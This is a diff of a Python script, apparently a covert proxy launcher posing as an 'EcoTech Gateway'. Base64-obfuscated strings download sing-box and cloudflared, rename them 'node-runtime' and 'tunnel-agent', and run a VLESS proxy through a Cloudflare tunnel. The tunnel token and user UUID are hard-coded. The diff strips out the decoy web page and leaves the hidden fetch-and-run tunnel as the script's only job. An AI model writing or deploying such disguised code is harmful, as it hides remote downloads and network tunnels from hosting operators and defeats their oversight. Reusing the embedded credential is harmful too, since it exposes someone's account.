@@ -1,41 +1,17 @@
 import os
-import sys
 import subprocess
 import json
 import base64
 import time
-from http.server import HTTPServer, BaseHTTPRequestHandler
 
 def _d(s):
     return base64.b64decode(s).decode('utf-8')
-
-class _W(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/html; charset=utf-8')
-        self.end_headers()
-        try:
-            with open(_d('aW5kZXguaHRtbA=='), 'rb') as f:
-                self.wfile.write(f.read())
-        except Exception:
-            self.wfile.write(_d('PGgxPsOXIEVjb1RlY2ggR2F0ZXdheSBBY3RpdmUgKDIwMCBPSyk8L2gxPg==').encode('utf-8'))
-
-def _s():
-    _p = int(os.environ.get('PORT', 8080))
-    _srv = HTTPServer(('0.0.0.0', _p), _W)
-    print(f"[EcoTech] Gateway running on port {_p}")
-    
-    import threading
-    _t = threading.Thread(target=_srv.serve_forever)
-    _t.daemon = True
-    _t.start()
-    _m()
 
 def _m():
     _r = _d('Li9ub2RlLXJ1bnRpbWU=')
     _a = _d('Li90dW5uZWwtYWdlbnQ=')
     
-    if not os.path.exists(_r):
+    if not os.path.exists(_r) or not os.path.exists(_a):
         _cmd = _d('Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL1NhZ2VyTmV0L3NpbmctYm94L3JlbGVhc2VzL2Rvd25sb2FkL3YxLjkuMC9zaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC50YXIuZ3ogLW8gc2IudGFyLmd6ICYmIHRhciAtenh2ZiBzYi50YXIuZ3ogPiAvZGV2L251bGwgMj4mMSAmJiBtdiBzaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC9zaW5nLWJveCAuL25vZGUtcnVudGltZSAmJiBybSAtcmYgc2IudGFyLmd6IHNpbmctYm94LTEuOS4wLWxpbnV4LWFtZDY0ICYmIGN1cmwgLXNMIGh0dHBzOi8vZ2l0aHViLmNvbS9jbG91ZGZsYXJlL2Nsb3VkZmxhcmVkL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9jbG91ZGZsYXJlZC1saW51eC1hbWQ2NCAtbyB0dW5uZWwtYWdlbnQgJiYgY2htb2QgK3ggbm9kZS1ydW50aW1lIHR1bm5lbC1hZ2VudA==')
         subprocess.run(_cmd, shell=True, check=True)
 
@@ -45,7 +21,7 @@ def _m():
             "type": _d('dmxlc3M='),
             "tag": _d('dmxlc3MtaW4='),
             "listen": "127.0.0.1",
-            "listen_port": 8082,
+            "listen_port": 8080,
             "users": [{ "uuid": "2c11bde0-fa06-4438-9ff0-f8502faf6aa3" }],
             "transport": {
                 "type": _d('d3M='),
@@ -66,7 +42,10 @@ def _m():
 
     _tk = "eyJhIjoiN2FhOWNmYTFkMDViOGYwMjY4NzYwNzRkNzBkNjI3MTgiLCJ0IjoiYzFhNWRlMzUtMTBlMi00MDVjLWJlMzgtODg3ZGY4YmNjYmM2IiwicyI6IlpUUTNObUkxWkRBdE5qVXdOUzAwTkRSa0xUa3dPVFl0WXpCbE1UaGpOek14WldGaiJ9"
     
-    subprocess.run([_a, 'tunnel', '--no-autoupdate', 'run', '--token', _tk])
+    subprocess.Popen([_a, 'tunnel', '--no-autoupdate', 'run', '--token', _tk])
+
+    while True:
+        time.sleep(3600)
 
 if __name__ == '__main__':
-    _s()
+    _m()
